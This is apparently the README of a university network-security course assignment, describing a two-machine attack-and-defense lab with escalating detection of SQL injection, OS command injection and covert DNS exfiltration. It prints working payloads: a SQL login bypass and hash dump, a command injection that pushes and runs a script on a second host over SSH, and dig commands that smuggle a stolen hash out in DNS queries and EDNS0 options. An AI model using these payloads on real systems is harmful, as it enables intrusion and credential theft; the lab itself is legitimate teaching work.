# EECE655 Assignment 1

**Course:** EECE655 — Internet Security (Prof. Imad H. Elhajj)  
**Institution:** American University of Beirut (AUB)  
**Live Testing Portal:** [https://eece655.fun]
**Demonstration Video:** [https://youtu.be/Jou8oR8ScO0]

---

## 👥 Team Contributions & Roles

* **Defender:** **Anwar El Fatayri** — Engineered dual-server topology, custom Python HTTP web server (`http_server.py`), MariaDB schema/integration, DNS anomaly & EDNS0 packet inspector (`dns_server.py`), SSH log forwarding daemon (`log_forwarder.py`), and real-time Telegram notification engine (`send_notifications.py`).
* **Attacker:** **Jad Eido** — Designed multi-stage exploit chains (`attack_v1.py`, `attack_v2.py`), SQL authentication bypasses, dual-engine OS command injection payloads, SSH argument pollution, and covert QNAME/EDNS0-OPT DNS data exfiltration routines.

---

## 🌐 Network Architecture & Topology

The project is hosted in an isolated production-grade testing environment outside the AUB campus network across two primary nodes:

```text
+---------------------------------------------------+        Encrypted SSH Tunnel        +---------------------------------------------------+
|               MACHINE A (10.40.40.21)             |  ================================> |               MACHINE B (10.40.40.22)             |
|                                                   |        (Log Forwarding Stream)     |                                                   |
| • Custom Python HTTP Web Server (v0-v3 Modes)     |                                    | • Custom UDP DNS Listener (Port 53)               |
| • MariaDB Database Server (`portal`)              |                                    | • QNAME & EDNS0 Deep Packet Inspector             |
| • Audit Log Logger (`/tmp/audit.log`)             |                                    | • Telegram Notification Engine (`send_notifications.py`)
| • SSH Client (Key:`/root/.ssh/id_rsa_utilities)   |                                    | • Target Utilities Account (`utilities`)           |
+---------------------------------------------------+                                    +---------------------------------------------------+
```

---

## 📁 Repository Directory Structure

```text
eece655-assignment1/
│
├── README.md                           # Main repository documentation & setup guide
│
├── defender/                           # Defensive infrastructure and server components
│   ├── machine_a/                      # Web & Database Gateway (10.40.40.21)
│   │   ├── http_server.py              # Custom Python HTTP server (v0-v3 security modes)
│   │   ├── main.py             		# Http server launcher
│   │   ├── log_forwarder.py            # Real-time SSH log piping daemon
│   │
│   └── machine_b/                      # Internal Utilities Host & DNS Listener (10.40.40.22)
│       ├── dns_server.py               # Raw socket DNS listener with QNAME & EDNS0 inspection
│       ├── send_notifications.py       # Real-time Telegram alert dispatcher
│       └── main.py             		# DNS server launcher
│
├── attacker/                           # Offensive exploit scripts & exfiltration routines
│   ├── attack_v1.py                    # Iteration 1: Login SQLi, OS Command Injection & QNAME Exfiltration
│   └── attack_v2.py                    # Iteration 2: SSRF / Argument Pollution & EDNS0 Covert DNS Exfiltration
│
├── AI_Prompts_Outputs/                 # Required GenAI prompt logs & code mapping
│   ├── defender_prompts_and_outputs.md  # Defender GenAI attribution (HTML templates, build_dns_response)
│   └── attacker_prompts_and_outputs.md  # Attacker GenAI attribution (Payload balancing, EDNS0 syntax)
│
└── docs/                               # Project documentation & deliverables
    ├── EECE655_Assignment1_Report.pdf
```

---

## ⚡ Attack & Defense Iteration Progressions

### Overview Matrix

| Version Mode | Defender Controls (Machine A & B) | Attacker Vectors (`attack_v1.py` / `attack_v2.py`) | Result & Mitigation |
| :--- | :--- | :--- | :--- |
| **Version 0 (v0)** | Unmonitored baseline; dynamic string SQL queries & unescaped `subprocess` calls. | Login SQLi (`utilities' #`), OS Command Injection (`#'; ssh ... `), QNAME DNS exfiltration. | **Exploit Success:** Admin hash leaked & remote shell commands executed on Machine B. |
| **Version 1 (v1)** | Machine A strips `'` and `;`; Machine B detects QNAME subdomain length > 20 & entropy. | Numeric UNION SQLi in Services dashboard; QNAME entropy exfiltration. | **Detected:** Machine B logs anomaly to `/tmp/audit.log` & triggers Telegram alert. |
| **Version 2 (v2)** | Machine A enforces some known characters checks; Machine B parses EDNS0 TYPE 41 OPT records. | SQL and OS Command Injections again; EDNS0 Option 65001 covert channel (`+ednsopt=65001:<payload>`). | **Detected:** EDNS0 covert option detected, and alert dispatched. |
| **Version 3 (v3)** | **Fully Hardened:** Attacker blocked completely from system access. 

---

### Detailed Exploitation Progression 

#### 2.1 Iteration 1: Initial Exploitation Sequence – `attack_v1.py`

1. **Reconnaissance:** Login portal message reveals admin and utilities accounts are restricted to local network access only.
2. **Auth Bypass:** SQL injection against `admin` fails due to password hash checks, but `utilities' #` succeeds.
3. **Info Disclosure:** Clicking the "Connect via SSH" button discloses sensitive SSH debug information (leaking Machine B IP `10.40.40.22` and SSH key path `/root/.ssh/id_rsa_utilities`).
4. **Database Dump - SQL Injection Payload (Username field):**
   ```sql
   utilities' UNION SELECT * FROM users WHERE username='admin' INTO OUTFILE '/var/lib/mysql/hash' #
   ```
5. **Remote Sniffer Deployment - OS Command Injection Payload (Username field):**
   ```bash
   utilities'#'; B64="aW1wb3J0IHNv(...)"; echo "$B64" | base64 -d | ssh -i /root/.ssh/id_rsa_utilities -o StrictHostKeyChecking=no utilities@10.40.40.22 "cat > /tmp/dns_sniffer.py && sudo nohup python3 /tmp/dns_sniffer.py > /tmp/sniffer.log 2>&1 &" #
   ```
   *(Note: Iteration 1 tests QNAME subdomains for exfiltration; Iteration 2 tests EDNS0 OPT headers).*
6. **Credential Exfiltration - OS Command Injection Exfiltration Payload:** Sends hash via QNAME DNS query:
   ```bash
   utilities'#'; HASH=$(awk '$2=="admin" {print $3}' /var/lib/mysql/hash); dig @10.40.40.22 ${HASH}.admin-hash.utilities.local #
   ```
   *(Note: The admin hash uses a weak MD5 algorithm intentionally for instant offline cracking).*

---

#### 2.2 Iteration 2: SSRF Exploitation Sequence – `attack_v2.py`

1. **Reconnaissance:** Services Monitoring section reveals status verification options for internal services.
2. **SSRF Attack Surface:** Insufficient input sanitization on the services checks allows SQL and OS command injections again—allowing the extraction of admin password from DB and the deployment of the sniffer on utilities server again.
3. **EDNS0-OPT Covert DNS Exfiltration:** Bypassing QNAME length/entropy detection filters by exfiltrating the extracted hash inside the EDNS0 Additional OPT field (`+ednsopt`) while keeping the requested domain name clean:
   ```bash
   22 ; HASH=$(cat /var/lib/mysql/testv2); dig @10.40.40.22 utilities.eece655.fun +ednsopt=65001:${HASH}
   ```

---

## 🚀 Execution & Verification Guide

### 1. Attacker Execution
To test the complete attack, detection, alerting, and defense lifecycle:
1. Clone the repository and navigate to `attacker/`.
2. Access the live portal at [https://eece655.fun] to backend modes.
3. Execute the automated attack scripts:
   ```bash
   # Run Iteration 1 Exploitation Chain
   python3 attacker/attack_v1.py

   # Run Iteration 2 Exploitation Chain
   python3 attacker/attack_v2.py
   ```

### 2. Defender Environment Setup
To initialize the defensive infrastructure manually:
Access https://eece655.fun and backend versions to observe when an attack goes undetected, when it is detected, and when it is blocked as defensive controls escalate.

### 3. Telegram Real-Time Mobile Notifications
📌 **NOTE:** If you wish to receive live Telegram security notifications on your mobile device, simply share your Bot Token and Chat ID with us and we will configure `send_notifications.py` on Machine B (`10.40.40.22`) for you. 
Alternatively, a live demonstration of the real-time notification pipeline can be provided upon request...
